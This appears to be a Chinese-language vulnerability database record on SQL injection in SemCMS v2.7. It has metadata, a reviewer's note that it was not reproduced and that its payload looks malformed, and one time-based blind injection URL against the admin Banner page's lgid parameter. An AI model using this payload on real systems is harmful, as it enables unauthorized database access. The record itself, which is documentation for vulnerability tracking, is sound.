---
source: "hatch 补库批 20260928"
product: "SemCMS2.7"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Semcms v2.7 sql注入漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：后台Banner页权限/随机目录，lgid数值SQL"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-4fd63e4fd1158cce3905bf73"
entity_id: "ve-4fd63e4fd1158cce3905bf73"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：后台Banner页权限/随机目录，lgid数值SQL

- **证据待核（1）**：length(database()&gt;0)括号位置非通常length(database())&gt;0，载荷意图与逻辑需校正。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **适用与权限边界（2）**：无认证/响应/源码/出处；标题漏后台，随机sbifr_Admin不能通用。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Semcms v2.7 sql注入漏洞

一、漏洞简介
------------

二、漏洞影响
------------

Semcms v2.7

三、复现过程
------------

    http://0-sec.org/semcms/sbifr_Admin/SEMCMS_Banner.php?err=001&lgid=1 and if(length(database()>0),sleep(10),1) --
